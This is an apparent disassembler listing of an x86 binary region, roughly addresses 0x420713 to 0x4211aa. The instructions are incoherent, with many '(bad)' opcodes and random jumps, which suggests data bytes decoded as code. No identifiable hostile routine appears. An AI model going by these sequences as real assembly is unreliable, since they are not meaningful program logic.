  420713:	adc    edx,DWORD PTR [ebx]
  420715:	jge    0x420747
  420717:	ins    BYTE PTR es:[edi],dx
  420718:	das    
  420719:	sub    eax,0xace0a86a
  42071e:	in     al,0x57
  420720:	mov    ch,0xd7
  420722:	(bad)  
  420723:	cmp    BYTE PTR [eax+ebp*8+0x13eb13a1],dh
  42072a:	dec    esi
  42072b:	aam    0x37
  42072d:	xor    eax,DWORD PTR [ebp+0x4896d141]
  420733:	enter  0x75bd,0xe6
  420737:	loopne 0x42075a
  420739:	and    al,0x60
  42073b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42073c:	and    BYTE PTR [edi-0x79b2320d],cl
  420742:	cli    
  420743:	fstp   DWORD PTR [ecx-0x5bad55cc]
  420749:	iret   
  42074a:	(bad)  
  42074c:	arpl   cx,cx
  42074e:	and    DWORD PTR [ebp+0x281e9e57],0x63
  420755:	jmp    0xa5976231
  42075a:	mov    ebp,0x328a3389
  42075f:	aad    0x43
  420761:	jnp    0x42075c
  420763:	mov    ebx,0x42d3ad59
  420768:	ret    
  420769:	call   0x18983e74
  42076e:	and    al,0x6b
  420770:	call   0x976f:0x205f3bae
  420777:	pusha  
  420778:	sub    al,0xd9
  42077a:	fwait
  42077b:	arpl   dx,bx
  42077d:	(bad)  
  42077e:	shl    BYTE PTR [ecx],cl
  420780:	aad    0xbe
  420782:	test   al,0xd8
  420784:	nop
  420785:	scas   eax,DWORD PTR es:[edi]
  420786:	adc    al,0xb7
  420788:	or     BYTE PTR [edx-0x41539efb],cl
  42078e:	pop    es
  42078f:	push   ds
  420790:	dec    edx
  420791:	ficom  WORD PTR [ebx-0x2c]
  420794:	nop
  420795:	jae    0x4207f9
  420797:	test   BYTE PTR [edi+0x4ba671f],al
  42079d:	mov    ch,0xd3
  42079f:	adc    DWORD PTR [esi+edi*1-0x2c],ebx
  4207a3:	fild   QWORD PTR [ebx-0x20b1174f]
  4207a9:	xor    eax,0xa7fc2616
  4207ae:	pop    ds
  4207af:	sar    dl,0x35
  4207b2:	mov    ch,0x0
  4207b4:	or     al,0xb7
  4207b6:	fist   DWORD PTR [ebx+0x12]
  4207b9:	js     0x4207e6
  4207bb:	es mov dh,0xec
  4207be:	xchg   BYTE PTR [eax+0x985e],bl
	...
  420834:	mov    eax,ds:0x3b920b9a
  420839:	xchg   ebx,eax
  42083a:	mov    ecx,0xafa823bb
  42083f:	mov    bh,0x62
  420841:	or     DWORD PTR [edi+0x15cb4a4],0x0
  420848:	test   BYTE PTR [eax],0x0
  42084b:	add    BYTE PTR [ebx],ch
  42084d:	hlt    
  42084e:	sbb    DWORD PTR [esi+0x7e],ebp
  420851:	jnp    0x420887
  420853:	outs   dx,DWORD PTR ds:[esi]
  420854:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420855:	mov    al,0x2c
  420857:	aam    0xfa
  420859:	cmp    bh,dl
  42085b:	daa    
  42085c:	xchg   ecx,eax
  42085d:	mov    dl,0x2
  42085f:	bound  ebp,QWORD PTR [ecx]
  420861:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420862:	dec    edx
  420863:	push   es
  420864:	popa   
  420865:	out    dx,eax
  420866:	jge    0x420844
  420868:	dec    edx
  420869:	push   ds
  42086a:	jns    0x420856
  42086c:	sub    DWORD PTR [ecx+ebp*1+0x19],edx
  420870:	push   0xfffffffc
  420872:	push   ebp
  420873:	std    
  420874:	jnp    0x420835
  420876:	rol    DWORD PTR [eax+esi*8-0x76805dd9],0xaf
  42087e:	shl    BYTE PTR [ecx+0x3298f4c5],0x99
  420885:	cmc    
  420886:	cmp    DWORD PTR [edi],ebx
  420888:	sbb    BYTE PTR [eax-0x34],bl
  42088b:	(bad)  
  42088d:	jne    0x4208c5
  42088f:	jmp    0x646e:0xec1cd4d2
  420896:	dec    ebx
  420897:	outs   dx,BYTE PTR ds:[esi]
  420898:	fmul   DWORD PTR [edi-0x3]
  42089b:	adc    eax,0x604b198e
  4208a0:	sar    BYTE PTR [ecx],0x22
  4208a3:	xlat   BYTE PTR ds:[ebx]
  4208a4:	mov    sp,0x5222
  4208a8:	fidiv  DWORD PTR [esi-0x4c]
  4208ab:	(bad)  
  4208ac:	fist   WORD PTR ds:0x7467e9e1
  4208b2:	(bad)  
  4208b3:	pop    esi
  4208b4:	dec    eax
  4208b5:	mov    eax,DWORD PTR [edx+0x44a87a03]
  4208bb:	xor    edi,DWORD PTR [ebx+edx*4+0x797279c7]
  4208c2:	ficomp DWORD PTR [ebp-0x16]
  4208c5:	fs aam 0xf
  4208c8:	push   ebx
  4208c9:	sbb    eax,DWORD PTR [edx+ecx*2]
  4208cc:	imul   BYTE PTR [edx]
  4208ce:	fcmovbe st,st(6)
  4208d0:	ret    
  4208d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208d2:	adc    al,0x2c
  4208d4:	push   ds
  4208d5:	inc    esp
  4208d6:	pop    es
  4208d7:	hlt    
  4208d8:	inc    ebp
  4208d9:	jo     0x42090d
  4208db:	adc    al,0x3a
  4208dd:	pop    esp
  4208de:	pusha  
  4208df:	or     eax,0xd50c939a
  4208e4:	sbb    al,0xd9
  4208e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208e7:	test   eax,0x59a64743
  4208ec:	rol    BYTE PTR ss:[edx-0x2d],cl
  4208f0:	les    ebp,FWORD PTR [ecx-0x3e]
  4208f3:	cli    
  4208f4:	repnz inc DWORD PTR [ebp+0x64]
  4208f8:	dec    ebx
  4208f9:	pusha  
  4208fa:	xor    DWORD PTR [edx+0x44827456],ebp
  420900:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420901:	pop    esp
  420902:	xor    DWORD PTR [ebx+0x45a561cd],ebp
  420908:	icebp  
  420909:	add    BYTE PTR [ebp+0x10eb5a74],ah
  42090f:	aaa    
  420910:	call   0xab3525c0
  420915:	mov    al,ds:0xc5eeb11a
  42091a:	(bad)  
  42091b:	sbb    bh,BYTE PTR [esi+edi*8]
  42091e:	int3   
  42091f:	ror    BYTE PTR [ebx+ebp*2-0x3e],0xbb
  420924:	aam    0xfa
  420926:	fadd   st,st(4)
  420928:	adc    dh,BYTE PTR [eax+0x40]
  42092b:	sub    ch,BYTE PTR [esi]
  42092d:	in     al,0xef
  42092f:	mov    bl,0x3f
  420931:	dec    esp
  420932:	jl     0x4208c5
  420934:	xchg   BYTE PTR [ebx+esi*1-0x71],ah
  420938:	push   0xffffffe6
  42093a:	and    bl,bh
  42093c:	jg     0x420961
  42093e:	adc    dh,BYTE PTR [edx]
  420940:	das    
  420941:	mov    ecx,0x0
	...
  4209b2:	add    BYTE PTR [eax],al
  4209b4:	or     al,BYTE PTR [ecx-0x49]
  4209b7:	mov    eax,ds:0xeb1ef7ff
  4209bc:	rcr    BYTE PTR [esi+0x600566de],0xba
  4209c3:	dec    ebp
  4209c4:	stos   BYTE PTR es:[edi],al
  4209c5:	pop    ebp
  4209c6:	add    DWORD PTR [eax],eax
  4209c8:	test   BYTE PTR [eax],0x0
  4209cb:	add    BYTE PTR [esi+0x2c],bh
  4209ce:	push   esi
  4209cf:	jo     0x420a38
  4209d1:	and    al,0x11
  4209d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209d4:	in     eax,dx
  4209d5:	jmp    0xcb9c:0xa1aee89a
  4209dc:	int    0xa0
  4209de:	(bad)  
  4209df:	jl     0x4209e7
  4209e1:	lods   al,BYTE PTR ds:[esi]
  4209e2:	mov    eax,ds:0xa84488a0
  4209e7:	or     ecx,DWORD PTR [eax+0x1814b809]
  4209ed:	stos   DWORD PTR es:[edi],eax
  4209ee:	push   0x6b
  4209f0:	in     al,dx
  4209f1:	jno    0x4209d7
  4209f3:	les    edi,FWORD PTR [edi+0x2e]
  4209f6:	or     DWORD PTR [ecx],ebx
  4209f8:	pminsw mm2,QWORD PTR [ebx]
  4209fb:	mov    bl,0x8a
  4209fd:	mov    eax,ds:0x7af3b843
  420a02:	retf   
  420a03:	sub    al,0x7e
  420a05:	sbb    DWORD PTR [eax],esi
  420a07:	data16 aas 
  420a09:	mov    edx,ebp
  420a0b:	sbb    al,0x3d
  420a0d:	adc    ebx,DWORD PTR [ebx]
  420a0f:	inc    eax
  420a10:	cmc    
  420a11:	mov    cl,BYTE PTR [ecx+0x2ca7e0de]
  420a17:	fistp  WORD PTR [edx]
  420a19:	inc    edi
  420a1a:	jnp    0x420a3b
  420a1c:	jle    0x420a45
  420a1e:	imul   ebp,edi,0xddf19c39
  420a24:	push   edi
  420a25:	popa   
  420a26:	cwde   
  420a27:	add    ecx,esp
  420a29:	lea    esp,[edi]
  420a2b:	add    al,0xe2
  420a2d:	test   al,0xf8
  420a2f:	in     al,0xbd
  420a31:	push   0xffffff8a
  420a33:	mov    al,ds:0xed7d0e7b
  420a38:	push   ebx
  420a39:	ret    
  420a3a:	jge    0x420a9d
  420a3c:	pop    esp
  420a3d:	mov    bh,0xfd
  420a3f:	test   DWORD PTR [edx+edx*2],ecx
  420a42:	push   edx
  420a43:	(bad)  
  420a45:	pop    eax
  420a46:	std    
  420a47:	xor    bh,0x24
  420a4a:	shl    DWORD PTR [ebp+0x4b],1
  420a4d:	and    eax,0xc076d5e7
  420a52:	in     al,0xee
  420a54:	or     al,0xdf
  420a56:	sub    edi,ecx
  420a58:	mov    DWORD PTR [edi-0x6c0cd031],ebx
  420a5e:	inc    ebx
  420a5f:	fistp  DWORD PTR [ebp-0x7ee68272]
  420a65:	push   ecx
  420a66:	hlt    
  420a67:	int    0x6a
  420a69:	lds    ebx,FWORD PTR [esi+0x41490ff7]
  420a6f:	sbb    BYTE PTR [ecx],cl
  420a71:	xchg   DWORD PTR [ebx+0x24],edx
  420a74:	and    eax,0xad671c1d
  420a79:	add    BYTE PTR [edi-0x1128e162],0x75
  420a80:	mov    edx,0x4a266ae6
  420a85:	popf   
  420a86:	pop    edi
  420a87:	outs   dx,DWORD PTR ds:[esi]
  420a88:	shl    BYTE PTR [edx+esi*1],cl
  420a8b:	pop    ecx
  420a8c:	retf   
  420a8d:	inc    esp
  420a8e:	dec    esp
  420a8f:	fwait
  420a90:	mov    ds:0x68b6d507,eax
  420a95:	mov    BYTE PTR [eax],cl
  420a97:	pusha  
  420a98:	pop    edx
  420a99:	fidiv  DWORD PTR [eax+0x36a4667f]
  420a9f:	pop    esi
  420aa0:	cmp    eax,0x99aeaac7
  420aa5:	std    
  420aa6:	imul   eax,DWORD PTR [esi],0x1266a0
  420aac:	xchg   edi,eax
  420aad:	ffreep st(3)
  420aaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ab0:	js     0x420ad9
  420ab2:	mov    bl,0x3
  420ab4:	scas   eax,DWORD PTR es:[edi]
  420ab5:	icebp  
  420ab6:	inc    ebp
  420ab7:	xchg   ebx,eax
  420ab8:	cmp    dh,BYTE PTR [ebx+0x55350890]
  420abe:	pop    edi
  420abf:	enter  0xcd54,0x0
	...
  420b33:	add    ah,bl
  420b35:	sub    BYTE PTR [edx-0x119011c],cl
  420b3b:	cmp    BYTE PTR [edi+0x39],dl
  420b3e:	dec    edx
  420b3f:	(bad)  
  420b41:	mov    ch,BYTE PTR [eax]
  420b43:	pop    es
  420b44:	mov    al,ds:0xf600015e
  420b49:	add    BYTE PTR [eax],al
  420b4b:	add    BYTE PTR [esi],cl
  420b4d:	(bad)  
  420b4e:	sbb    esi,DWORD PTR [esp+edi*1-0x14]
  420b52:	or     al,0x7f
  420b54:	ror    DWORD PTR ds:0x7ba8308c,1
  420b5a:	inc    eax
  420b5b:	jg     0x420b67
  420b5d:	or     al,0xa9
  420b5f:	dec    eax
  420b60:	je     0x420b02
  420b62:	mov    ch,0x1f
  420b64:	es push edx
  420b66:	mov    ds:0xa64f3fab,eax
  420b6b:	aam    0xc9
  420b6d:	sub    dh,BYTE PTR [ecx-0x1760c2ed]
  420b73:	dec    esp
  420b74:	inc    esi
  420b75:	mov    dl,0xac
  420b77:	cmp    edx,0xc54629f9
  420b7d:	mov    esi,DWORD PTR [ecx+0x2e76815b]
  420b83:	lahf   
  420b84:	std    
  420b85:	(bad)  
  420b86:	popa   
  420b87:	mov    esi,0x8efdf7d5
  420b8c:	push   eax
  420b8d:	in     eax,dx
  420b8e:	stc    
  420b8f:	dec    esi
  420b90:	sbb    bh,ah
  420b92:	pop    esp
  420b93:	ds or  al,0xba
  420b96:	loopne 0x420b57
  420b98:	xor    eax,0x2b72ea4
  420b9d:	ror    DWORD PTR [edi],1
  420b9f:	nop
  420ba0:	retf   
  420ba1:	out    dx,eax
  420ba2:	pop    ebx
  420ba3:	add    BYTE PTR [edx],bh
  420ba5:	mov    ch,0xdb
  420ba7:	push   edi
  420ba8:	rcr    BYTE PTR [esi],1
  420baa:	mov    dh,0xad
  420bac:	mov    ds:0xeae5d5f8,eax
  420bb1:	std    
  420bb2:	mov    ch,0xe7
  420bb4:	hlt    
  420bb5:	add    DWORD PTR [edi+0x18],esp
  420bb8:	cmp    cl,dl
  420bba:	inc    edx
  420bbb:	xchg   esi,eax
  420bbc:	ss (bad) 
  420bbe:	aam    0x1c
  420bc0:	inc    eax
  420bc1:	push   ebx
  420bc2:	in     eax,dx
  420bc3:	jne    0x420b79
  420bc5:	xor    al,0x99
  420bc7:	jbe    0x420c31
  420bc9:	pop    edx
  420bca:	js     0x420b7b
  420bcc:	into   
  420bcd:	je     0x420c39
  420bcf:	xor    DWORD PTR [eax],ebp
  420bd1:	push   cs
  420bd2:	ret    0xa58e
  420bd5:	sub    al,0xb7
  420bd7:	inc    ebx
  420bd8:	xchg   edi,eax
  420bd9:	ja     0x420c18
  420bdb:	sub    eax,0xadd3f55b
  420be0:	ins    DWORD PTR es:[edi],dx
  420be1:	sub    ebp,esp
  420be3:	aaa    
  420be4:	push   edi
  420be5:	jp     0x420c5a
  420be7:	lea    esp,[esi-0x313638b9]
  420bed:	scas   eax,DWORD PTR es:[edi]
  420bee:	scas   al,BYTE PTR es:[edi]
  420bef:	imul   DWORD PTR [edi-0x225b6479]
  420bf5:	std    
  420bf6:	xor    edi,DWORD PTR [ecx]
  420bf8:	and    DWORD PTR [edx-0x5],esi
  420bfb:	adc    al,0x1b
  420bfd:	push   0xffffffce
  420bff:	dec    esp
  420c00:	jnp    0x420ba9
  420c02:	popf   
  420c03:	push   ebx
  420c04:	cld    
  420c05:	sbb    ebx,ebp
  420c07:	and    al,dl
  420c09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c0a:	int    0xb3
  420c0c:	int    0x44
  420c0e:	in     al,0x8d
  420c10:	add    BYTE PTR [edi+0x71],bh
  420c13:	mov    al,0xd4
  420c15:	pop    ss
  420c16:	xchg   esp,eax
  420c17:	adc    edx,DWORD PTR [eax-0x35]
  420c1a:	in     eax,dx
  420c1b:	sti    
  420c1c:	xchg   DWORD PTR [esi],esp
  420c1e:	shl    edi,1
  420c20:	cdq    
  420c21:	imul   ebp,DWORD PTR [edi+ecx*4],0xfffffffa
  420c25:	adc    al,0x83
  420c27:	xor    al,0xe1
  420c29:	mov    cl,0xec
  420c2b:	(bad)  
  420c2d:	stos   DWORD PTR es:[edi],eax
  420c2e:	mov    al,ds:0x927c320b
  420c33:	mov    al,0x4d
  420c35:	sbb    dh,BYTE PTR [bx]
  420c38:	adc    edx,esp
  420c3a:	and    DWORD PTR [edx+0x99b99f2],ebp
  420c40:	ds jmp 0x420c46
	...
  420cb2:	add    BYTE PTR [eax],al
  420cb4:	or     al,0x6a
  420cb6:	push   edx
  420cb7:	shl    DWORD PTR [esi-0x7],0x9f
  420cbb:	out    dx,eax
  420cbc:	xchg   ecx,eax
  420cbd:	inc    ecx
  420cbe:	push   0xd3c03e5f
  420cc3:	dec    edi
  420cc4:	xchg   esi,eax
  420cc5:	pop    edi
  420cc6:	add    DWORD PTR [eax],eax
  420cc8:	test   BYTE PTR [eax],0x0
  420ccb:	add    BYTE PTR [ecx+0x12],cl
  420cce:	pop    ebx
  420ccf:	jns    0x420cd3
  420cd1:	test   dl,0x62
  420cd4:	or     al,0xb7
  420cd6:	shl    BYTE PTR [edi],cl
  420cd8:	pop    DWORD PTR [ebx]
  420cda:	sub    DWORD PTR [ebp-0x5c12e66d],ebp
  420ce0:	mov    edx,0xcdaeaee8
  420ce5:	inc    ecx
  420ce6:	div    DWORD PTR [eax-0x39]
  420ce9:	mov    ebx,gs
  420ceb:	inc    ebp
  420cec:	or     esi,esp
  420cee:	push   cs
  420cef:	shr    BYTE PTR [edi-0x59d264ac],cl
  420cf5:	in     eax,0xfc
  420cf7:	push   esi
  420cf8:	push   esi
  420cf9:	arpl   dx,cx
  420cfb:	mov    ch,0x72
  420cfd:	mov    esi,0xfff197ba
  420d02:	ds icebp 
  420d04:	and    DWORD PTR [ebp-0x42c7ce70],ebx
  420d0a:	enter  0x8d60,0x8a
  420d0e:	ja     0x420d43
  420d10:	mov    eax,0x646e2418
  420d16:	mov    dl,dh
  420d18:	aam    0x34
  420d1a:	xchg   esp,eax
  420d1b:	(bad)  
  420d1d:	fisubr DWORD PTR [edx-0x25]
  420d20:	sub    ch,BYTE PTR [eax+0x49]
  420d23:	(bad)  [ebp+0x28d6e689]
  420d29:	mov    esp,0x35159bcc
  420d2e:	xchg   BYTE PTR [ebx],bh
  420d30:	jle    0x420cb3
  420d32:	mov    esp,0xd32d9dd8
  420d37:	jl     0x420d1a
  420d39:	out    0x26,al
  420d3b:	push   esi
  420d3c:	out    0x16,eax
  420d3e:	cmp    BYTE PTR [eax+0x3a1bd7a6],ch
  420d44:	add    al,0x17
  420d46:	in     eax,0x73
  420d48:	jb     0x420d06
  420d4a:	test   bh,0x4
  420d4d:	and    eax,0x4192063
  420d52:	adc    BYTE PTR [edi-0x4],0xb3
  420d56:	add    DWORD PTR [esi+0x16],eax
  420d59:	adc    edx,eax
  420d5b:	daa    
  420d5c:	stos   BYTE PTR es:[edi],al
  420d5d:	cld    
  420d5e:	stos   BYTE PTR es:[edi],al
  420d5f:	addr16 in al,0x63
  420d62:	(bad)  
  420d63:	xchg   ebp,eax
  420d64:	dec    ebx
  420d65:	cmp    BYTE PTR [ebx],ch
  420d67:	mov    eax,0x1f023a5e
  420d6c:	sbb    DWORD PTR [esi+0x5accc04],esp
  420d72:	aad    0x6f
  420d74:	lods   eax,DWORD PTR ds:[esi]
  420d75:	push   0xfffffff3
  420d77:	adc    cl,dh
  420d79:	dec    esp
  420d7a:	out    0x8f,eax
  420d7c:	daa    
  420d7d:	xchg   ecx,eax
  420d7e:	js     0x420d4d
  420d80:	out    dx,al
  420d81:	and    al,0xfc
  420d83:	xchg   ebp,eax
  420d84:	popf   
  420d85:	mov    al,ds:0x57e704f5
  420d8a:	cmp    eax,0x7bff1b05
  420d8f:	sub    DWORD PTR [ebx+0xf55359],0x86312716
  420d99:	push   0x56
  420d9b:	push   edx
  420d9c:	leave  
  420d9d:	push   esp
  420d9e:	ret    
  420d9f:	dec    edx
  420da0:	mov    ebx,0x79993fed
  420da5:	pop    ebp
  420da6:	lahf   
  420da7:	sbb    DWORD PTR [eax+ebx*1-0x39],edi
  420dab:	lea    ebp,[edi-0x4535658]
  420db1:	leave  
  420db2:	add    DWORD PTR [ebx+0x69],esi
  420db5:	inc    esi
  420db6:	and    BYTE PTR [ebp+0x604c8bc7],ah
  420dbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420dbd:	push   ss
  420dbe:	mov    al,ds:0x528e7d
	...
  420e33:	add    BYTE PTR [edx-0x1865ab],ch
  420e39:	out    dx,eax
  420e3a:	call   FWORD PTR [ebp+0x64]
  420e3d:	inc    ebx
  420e3e:	and    edx,ecx
  420e40:	lds    ebp,FWORD PTR [esi-0x3d]
  420e43:	ja     0x420dd1
  420e45:	pusha  
  420e46:	add    DWORD PTR [eax],eax
  420e48:	test   BYTE PTR [eax],0x0
  420e4b:	add    BYTE PTR [esi+0x50a4a8f9],dl
  420e51:	dec    edi
  420e52:	mov    dh,0x31
  420e54:	imul   edx,DWORD PTR [eax],0x38
  420e57:	cmp    DWORD PTR [esi+0x35],ecx
  420e5a:	xchg   al,bh
  420e5c:	mov    WORD PTR [eax],cs
  420e5e:	inc    ebp
  420e5f:	imul   edx,DWORD PTR [ecx],0x53
  420e62:	push   edi
  420e63:	add    BYTE PTR [ebp+0x3a47cbd9],dh
  420e69:	push   edx
  420e6a:	mov    dh,0x1f
  420e6c:	jp     0x420eba
  420e6e:	retf   0x7cb6
  420e71:	cdq    
  420e72:	stos   BYTE PTR es:[edi],al
  420e73:	push   eax
  420e74:	add    DWORD PTR [ebx-0x5e6a2a8c],ebx
  420e7a:	inc    edx
  420e7b:	popf   
  420e7c:	xchg   edi,eax
  420e7d:	out    0x29,eax
  420e7f:	rcr    DWORD PTR [esi-0x1cc1e6c3],cl
  420e85:	iret   
  420e86:	pop    es
  420e87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e88:	ficomp DWORD PTR [ebx+esi*8-0x733559cb]
  420e8f:	aaa    
  420e90:	(bad)  
  420e92:	push   ecx
  420e93:	sbb    edx,DWORD PTR [edi-0x67]
  420e96:	sbb    al,0x55
  420e98:	inc    ebp
  420e99:	or     edi,ebp
  420e9b:	xor    BYTE PTR [eax],bh
  420e9d:	jae    0x420ef0
  420e9f:	and    eax,0x7bc5d7b6
  420ea4:	cmp    edx,DWORD PTR [eax-0x58d62695]
  420eaa:	fiadd  DWORD PTR [eax+0x56bb79d2]
  420eb0:	ret    0x749d
  420eb3:	aad    0x4e
  420eb5:	mov    dh,0xbf
  420eb7:	cmp    eax,0x8bf50fc8
  420ebc:	int3   
  420ebd:	xchg   edx,eax
  420ebe:	sbb    ebx,DWORD PTR [eax]
  420ec0:	js     0x420e95
  420ec2:	xchg   esi,eax
  420ec3:	stos   WORD PTR es:[edi],ax
  420ec5:	loopne 0x420e81
  420ec7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ec8:	xchg   ebp,eax
  420ec9:	jbe    0x420ed5
  420ecb:	jo     0x420f1f
  420ecd:	jg     0x420ee7
  420ecf:	jnp    0x420ef5
  420ed1:	jge    0x420ed9
  420ed3:	mov    BYTE PTR [edi],dh
  420ed5:	ins    DWORD PTR es:[edi],dx
  420ed6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ed7:	jp     0x420e87
  420ed9:	inc    esi
  420eda:	cwde   
  420edb:	sub    esp,DWORD PTR [edi-0x6a9ecacd]
  420ee1:	pop    ebp
  420ee2:	add    esi,esp
  420ee4:	int    0x27
  420ee6:	scas   al,BYTE PTR es:[edi]
  420ee7:	ret    
  420ee8:	adc    al,0x7c
  420eea:	test   ecx,ecx
  420eec:	sub    al,0xc9
  420eee:	popf   
  420eef:	jecxz  0x420ebb
  420ef1:	ja     0x420ecb
  420ef3:	xor    BYTE PTR [edi-0x80],bl
  420ef6:	add    edi,DWORD PTR [edi+0x5834ec80]
  420efc:	push   DWORD PTR [edx-0xe2b39d5]
  420f02:	cmp    DWORD PTR [edx-0x7fc5adc8],edi
  420f08:	ret    
  420f09:	fwait
  420f0a:	cld    
  420f0b:	jb     0x420f5f
  420f0d:	sub    dh,ch
  420f0f:	sbb    ebx,DWORD PTR [ecx+0x1c8d49b5]
  420f15:	bound  esi,QWORD PTR [ecx]
  420f17:	ror    ebp,1
  420f19:	rol    ebp,0x6f
  420f1c:	adc    edx,DWORD PTR [edx]
  420f1e:	cmp    edx,ecx
  420f20:	lahf   
  420f21:	xchg   DWORD PTR [ecx+edx*2-0x13646191],edx
  420f28:	pusha  
  420f29:	xor    DWORD PTR [esi],esp
  420f2b:	stos   DWORD PTR es:[edi],eax
  420f2c:	add    BYTE PTR [esi+ecx*4],dh
  420f2f:	psrld  mm7,QWORD PTR [eax-0x23]
  420f33:	imul   ebx,DWORD PTR [esi-0x24246640],0x61
  420f3a:	pusha  
  420f3b:	xchg   esi,ebp
  420f3d:	xor    cl,ah
  420f3f:	pop    ecx
  420f40:	adc    ecx,ebx
	...
  420fb2:	add    BYTE PTR [eax],al
  420fb4:	bound  esp,QWORD PTR [ebp-0x8808a]
  420fba:	imul   edi,DWORD PTR [ebp-0x6d53d0f4],0xffffffbd
  420fc1:	jae    0x420f9f
  420fc3:	push   esi
  420fc4:	and    BYTE PTR [ecx+0x1],0x0
  420fc8:	test   BYTE PTR [eax],0x0
  420fcb:	add    BYTE PTR [eax+0x1d5a8483],dh
  420fd1:	xchg   edi,eax
  420fd2:	ds sub edx,ebp
  420fd5:	out    dx,eax
  420fd6:	test   BYTE PTR [ebx+0x134ea61f],dh
  420fdc:	jb     0x421038
  420fde:	ret    
  420fdf:	pop    ebp
  420fe0:	fld    st(3)
  420fe2:	inc    ecx
  420fe3:	mov    cl,0x4f
  420fe5:	outs   dx,DWORD PTR ds:[esi]
  420fe6:	fcmove st,st(2)
  420fe8:	mov    ebp,0xf8a42d37
  420fed:	push   eax
  420fee:	aad    0x4c
  420ff0:	scas   al,BYTE PTR es:[edi]
  420ff1:	lahf   
  420ff2:	(bad)  
  420ff3:	xchg   DWORD PTR [esi+0x49],eax
  420ff6:	push   edi
  420ff7:	retf   
  420ff8:	aam    0xe6
  420ffa:	rcl    DWORD PTR [ecx-0x7d],cl
  420ffd:	pop    edi
  420ffe:	mov    esp,DWORD PTR [ecx]
  421000:	rcr    BYTE PTR [edx+edi*8+0x69],1
  421004:	jg     0x420fb9
  421006:	imul   edi
  421008:	scas   eax,DWORD PTR es:[edi]
  421009:	cmp    eax,DWORD PTR [eax-0x7e]
  42100c:	jo     0x420fb6
  42100e:	mov    edx,0xb6c9aeb2
  421013:	adc    BYTE PTR [ecx-0x7346552f],al
  421019:	inc    ebp
  42101a:	sbb    eax,DWORD PTR [ebx+0x534f8af4]
  421020:	inc    ebx
  421021:	sub    BYTE PTR [ebp+0x23b4943b],bh
  421027:	ss jg  0x420fd5
  42102a:	in     al,dx
  42102b:	mov    ebp,0xa4878594
  421030:	pusha  
  421031:	out    0xca,eax
  421033:	dec    ecx
  421034:	pop    edx
  421035:	add    DWORD PTR [eax+0x4c9d183b],esp
  42103b:	fisub  DWORD PTR [ecx-0x7e7e8734]
  421041:	cdq    
  421042:	push   ss
  421043:	ins    BYTE PTR es:[edi],dx
  421044:	dec    edi
  421045:	aas    
  421046:	sti    
  421047:	mov    eax,ds:0x4bfa2aef
  42104c:	nop    DWORD PTR [edi]
  42104f:	dec    esi
  421050:	jae    0x421002
  421052:	fucomi st,st(2)
  421054:	jg     0x420ff0
  421056:	inc    esp
  421057:	cld    
  421058:	inc    esp
  421059:	in     al,dx
  42105a:	mov    WORD PTR [edi+eax*2-0x73f37a05],?
  421061:	push   si
  421063:	mov    ds:0x17d54c30,eax
  421068:	dec    ebp
  421069:	enter  0xb372,0x85
  42106d:	retf   
  42106e:	jnp    0x42101e
  421070:	ins    BYTE PTR es:[edi],dx
  421071:	call   0x59a1:0x33913fb
  421078:	mov    ah,0xef
  42107a:	fidiv  WORD PTR ds:0x34e6227
  421080:	jb     0x421082
  421082:	pop    esi
  421083:	sti    
  421084:	sub    edx,ecx
  421086:	cmp    eax,0x3a3616ed
  42108b:	xor    al,0xf9
  42108d:	adc    edx,DWORD PTR [ecx]
  42108f:	jmp    0xc818:0x25e345c8
  421096:	inc    eax
  421097:	loopne 0x4210d1
  421099:	add    BYTE PTR [eax],cl
  42109b:	sbb    al,BYTE PTR [edi-0x23]
  42109e:	int    0x1b
  4210a0:	sar    DWORD PTR [esi],0x20
  4210a3:	or     BYTE PTR [esi-0x1e],al
  4210a6:	call   0xcc80:0x95e2dc39
  4210ad:	pop    ecx
  4210ae:	sbb    ch,BYTE PTR [ebx-0xb3c317a]
  4210b4:	jb     0x4210aa
  4210b6:	inc    esp
  4210b7:	sbb    esi,DWORD PTR [ebx+esi*4-0x40]
  4210bb:	push   edx
  4210bc:	mov    dl,0xb5
  4210be:	xor    DWORD PTR [ebx+0xf05d],edx
	...
  421134:	jae    0x421105
  421136:	fwait
  421137:	cmp    DWORD PTR [edi+0x15cff37d],edi
  42113d:	dec    edi
  42113e:	data16 jg 0x4211a9
  421141:	aaa    
  421142:	adc    al,0xb5
  421144:	js     0x4211a8
  421146:	add    DWORD PTR [eax],eax
  421148:	test   BYTE PTR [eax],0x0
  42114b:	add    al,bh
  42114d:	jno    0x4210d6
  42114f:	mov    al,BYTE PTR [edi-0x3a]
  421152:	cld    
  421153:	test   eax,0x253c8ef6
  421158:	aas    
  421159:	xchg   edi,eax
  42115a:	push   cs
  42115b:	xor    DWORD PTR [esi+edi*8+0x3c26cc2d],ebp
  421162:	outs   dx,DWORD PTR ds:[esi]
  421163:	or     edi,edi
  421165:	mov    cl,0xfc
  421167:	and    DWORD PTR [ecx-0x6085f809],esp
  42116d:	stc    
  42116e:	(bad)  
  42116f:	sub    al,0xec
  421171:	cmc    
  421172:	xchg   dl,ah
  421174:	cmp    esi,ecx
  421176:	mov    esp,0xb6857537
  42117b:	loopne 0x4211b2
  42117d:	or     ch,BYTE PTR [esi-0x7b]
  421180:	xchg   DWORD PTR [edx],ebp
  421182:	sub    al,0xd7
  421184:	push   eax
  421185:	inc    esp
  421186:	dec    eax
  421187:	push   esp
  421189:	pop    esi
  42118a:	sahf   
  42118b:	push   0x91027917
  421190:	hlt    
  421191:	pop    esi
  421192:	test   DWORD PTR [eax+0x23],0x5957e4a1
  421199:	clc    
  42119a:	mov    ebp,0xa85abd26
  42119f:	sbb    al,0x18
  4211a1:	pop    ebx
  4211a2:	out    0xc4,al
  4211a4:	push   esp
  4211a5:	sub    DWORD PTR [edx-0x65],esi
  4211a8:	sbb    al,0xfe
  4211aa:	sbb    dh,bl
